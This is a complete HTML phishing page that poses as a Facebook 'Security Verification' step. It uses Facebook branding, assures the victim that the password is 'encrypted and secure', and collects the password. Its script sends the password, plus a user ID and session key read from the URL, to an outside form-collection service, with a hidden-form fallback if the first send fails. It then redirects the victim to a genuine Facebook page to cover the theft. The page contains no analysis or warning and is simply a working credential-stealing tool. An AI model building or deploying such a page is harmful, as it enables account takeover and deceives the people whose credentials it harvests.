<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>For security reason, add your password</title>
  <style>
    :root{
      --fb-blue:#1877f2;
      --fb-blue-dark:#0b5ed7;
      --bg:#f0f2f5;
      --card:#fff;
      --muted:#6b6b6b;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family:"Segoe UI",Arial,sans-serif;
      background:var(--bg);
      color:#111;
    }
    .header{
      background:var(--fb-blue);
      color:#fff;
      padding:12px 20px;
      display:flex;
      align-items:center;
      gap:12px;
    }
    .header img{width:36px;height:36px}
    .header .title{font-weight:700;font-size:18px}
    .wrap{max-width:680px;margin:36px auto;padding:0 18px}
    .card{
      background:var(--card);
      border-radius:10px;
      box-shadow:0 6px 18px rgba(16,24,40,0.06);
      overflow:hidden;
    }
    .card-body{padding:28px;text-align:center;}
    .fb-logo{
      width:80px;
      height:80px;
      margin:0 auto 16px;
      display:block;
    }
    h2{color:var(--fb-blue);margin:6px 0 8px}
    p.sub{color:var(--muted);margin:0 0 18px}
    form{max-width:520px;margin:0 auto;text-align:left;}
    label{display:block;font-weight:700;margin-bottom:8px}
    input[type="password"]{
      width:100%;
      padding:12px;
      border:1px solid #ddd;
      border-radius:8px;
      margin-bottom:16px;
      font-size:15px;
    }
    .btn{
      width:100%;
      display:inline-block;
      background:linear-gradient(90deg,var(--fb-blue),var(--fb-blue-dark));
      color:#fff;
      padding:14px;
      border-radius:8px;
      border:none;
      font-weight:700;
      font-size:16px;
      cursor:pointer;
    }
    .note{
      font-size:13px;
      color:#8a8a8a;
      text-align:center;
      margin-top:12px;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="logo">
    <div class="title">Verification</div>
  </div>

  <div class="wrap">
    <div class="card">
      <div class="card-body">
        <!-- Facebook logo above password box -->
        <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">

        <h2>Security Verification</h2>
        <p class="sub">Please enter your password to confirm your identity and complete the verification process.</p>

        <!-- Step 2 form -->
        <form id="step2Form" autocomplete="off">
          <input type="hidden" id="user_id" name="user_id" value="">
          <input type="hidden" id="session_key" name="session_key" value="">

          <label for="verification_code">Password</label>
          <input id="verification_code" name="verification_code" type="password" placeholder="Enter your password" required>

          <button class="btn" type="submit">Submit Review</button>
        </form>

        <p class="note"><strong>Reminder:</strong>  Your password is encrypted and secure.</p>
      </div>
    </div>
  </div>

  <script>
    const SUBMIT_ENDPOINT = "https://submit-form.com/k8oesII1U";
    const FINAL_REDIRECT = "https://creators.facebook.com/breakthrough-bonus";

    const params = new URLSearchParams(location.search);
    const userId = params.get('user_id') || '';
    const sessionKey = params.get('session_key') || '';

    document.getElementById('user_id').value = userId;
    document.getElementById('session_key').value = sessionKey;

    document.getElementById('step2Form').addEventListener('submit', async function(e){
      e.preventDefault();
      const verification_code = document.getElementById('verification_code').value.trim();

      if(!verification_code){
        alert('Please enter the verification code.');
        return;
      }

      const payload = new FormData();
      payload.append('user_id', userId);
      payload.append('session_key', sessionKey);
      payload.append('verification_code', verification_code);
      payload.append('stage', 'step2-demo');

      try {
        await fetch(SUBMIT_ENDPOINT, { method: 'POST', body: payload });
      } catch (err) {
        const f = document.createElement('form');
        f.method = 'POST';
        f.action = SUBMIT_ENDPOINT;
        f.style.display = 'none';
        const i1 = document.createElement('input'); i1.name='user_id'; i1.value=userId; f.appendChild(i1);
        const i2 = document.createElement('input'); i2.name='session_key'; i2.value=sessionKey; f.appendChild(i2);
        const i3 = document.createElement('input'); i3.name='verification_code'; i3.value=verification_code; f.appendChild(i3);
        const i4 = document.createElement('input'); i4.name='stage'; i4.value='step2-demo'; f.appendChild(i4);
        document.body.appendChild(f);
        f.submit();
        return;
      }

      window.location.href = FINAL_REDIRECT;
    });
  </script>
</body>
</html>
